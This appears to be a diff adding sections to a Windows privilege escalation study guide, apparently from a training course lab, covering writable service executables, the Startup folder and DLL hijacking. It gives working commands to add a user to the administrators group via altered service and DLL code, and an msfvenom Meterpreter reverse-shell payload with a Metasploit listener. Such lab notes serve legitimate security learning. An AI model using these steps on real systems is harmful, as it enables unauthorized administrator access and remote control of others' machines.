@@ -142,6 +142,83 @@ Abuse of the research methodology of executable of windows. We will try to place
 - Now we just need to start the service `sc start regsvc`
 - `net localgroup administrators` we can see that our user is now in the administrators group
 
+## Escalation via Executable Files
+
+### What is it
+
+- Abusing an executable that we have permissions on
+
+### Enumeration
+
+- `powershell -ep bypass`
+- `. .\PowerUp.ps1`
+- `Invoke-AllChecks`  
+![image](https://user-images.githubusercontent.com/96747355/162591193-6d2cec98-1e15-492e-b129-001c59b1ae84.png)  
+
+**OR**
+
+- If we know what program it is we can just do `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"` where File Permissions Service is the program we want to abuse  
+![image](https://user-images.githubusercontent.com/96747355/162591258-02f01743-1c36-400c-9c13-539c42db8a79.png)  
+
+### How to exploit
+
+- We will use this [C script](https://github.com/sagishahar/scripts/blob/master/windows_service.c)
+- We will modify the whoami command: `system("whoami > c:\\windows\\temp\\service.txt");`  we will add this instead `cmd.exe /k net localgroup administrators user /add` so our script now looks like this: `system("cmd.exe /k net localgroup administrators user /add");`
+- We will compile it `x86_64-w64-mingw32-gcc windows_service.c -o x.exe`
+- Let's now get the the exe file in our target (python http server -> browser in our target to dl the file) and put it where we have write rights (in the example it is going to be C:\Temp)
+- In the target cmd `copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"`
+- `sc start filepermsvc`
+- Our user should be in the local administrators group
+
+## Startup Applications
+
+### What is it
+
+- We will abuse a program that is launched on startup in which we have rights
+
+### Enumeration
+
+- We can enumerate using [Windows internals - icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`  
+![image](https://user-images.githubusercontent.com/96747355/162592396-a2979aa4-f502-4455-b2ca-2b7997b1763c.png)  
+- The `BUILTIN/Users` group has full acces `(F)` to the Startup directory
+
+### How to exploit
+
+- In our attack machine `msfconsole` we launch Metasploit
+- `use multi/handler`
+- `set payload windows/meterpreter/reverse_tcp`
+- `set lhost IP-OF-OUR-ATTACK-MACHINE`
+- `run`
+- In another tab `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP-OF-OUR-ATTACK-MACHINE -f exe -o x.exe`
+- We serve the executable in our target (python http server -> and browse to it from our target)
+- We put the file in  "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" (If you are in the explorer you may have to type ProgramData in the path if it does not appear).
+- We wait for an admin to log in
+- We should have a shell in metasploit  
+![image](https://user-images.githubusercontent.com/96747355/162592807-7867e7e1-62f9-4cca-89b9-78ed895ee09c.png)  
+
+## DLL Hijacking
+
+### What is it
+
+- DLL is a dynamic Library they often run with executables, when an executable runs the system will look for the dll and if the dll does not exist we could replace it with one of our own.
+
+### Enumeration
+
+- We can find it using procmon, we need to add 2 filters "Result is NAME NOT FOUND" and "PATH ends with .dll"  
+![image](https://user-images.githubusercontent.com/96747355/162593986-a50865dc-11eb-44ef-8793-60bbdd2adaa1.png)  
+  - This will list the dll not found
+  - We will need write access to the folder where the dll are missing
+
+### How to exploit
+
+- We are going to use [windows_dll.c](https://github.com/sagishahar/scripts/blob/master/windows_dll.c)
+- Edit the file and modify the system command to add our user to the admin goup which would look like this: `system("cmd.exe /k net localgroup administrators user /add");`
+- We can now compile it `x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll`
+- We serve it to our target (python http server -> browser of our target)
+- We put it in the path where the system will look for it, in our example it is the temp folder
+- We restart the service `sc stop dllsvc & sc start dllsvc`
+- Our user should be in the admin group now
+
 ## Resources
 
 {% embed url="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" %} TCM Security Academy - Windows Privilege Escalation {% endembed %}  
